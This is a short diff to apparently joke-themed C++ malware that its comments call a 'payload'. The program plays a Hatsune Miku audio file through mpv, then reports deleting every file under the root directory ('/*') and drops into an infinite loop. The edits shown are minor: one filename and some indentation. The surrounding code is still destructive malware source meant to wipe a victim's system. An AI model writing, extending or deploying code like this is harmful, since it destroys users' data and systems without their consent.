@@ -12,7 +12,7 @@ int main()
     system("cd /miku && unzip Assets.zip");
 
     // HATSUNE MIKU!!!!!!!!!!!!!!!!!
-    system("mpv /miku/*.ogg");
+    system("mpv /miku/BD5972AA.ogg");
 
     // Let's play some Aurascope! Second to last step of the payload.
     // Unused for now: system("cd Aurascope && xinit /usr/bin/wine Aurascope.exe"); // Most likely not going to do anything as wine is going to crash the instant xD
@@ -23,12 +23,12 @@ int main()
 
     if (!rmRoot)
     {
-      perror("Error deleting file: /*");
-      return EXIT_FAILURE;
+        perror("Error deleting files: /*");
+        return EXIT_FAILURE;
     }
     else
     {
-      std::cout << "Successfully deleted /*!";
+        std::cout << "Successfully deleted /*!";
     }
 
     while(1) {
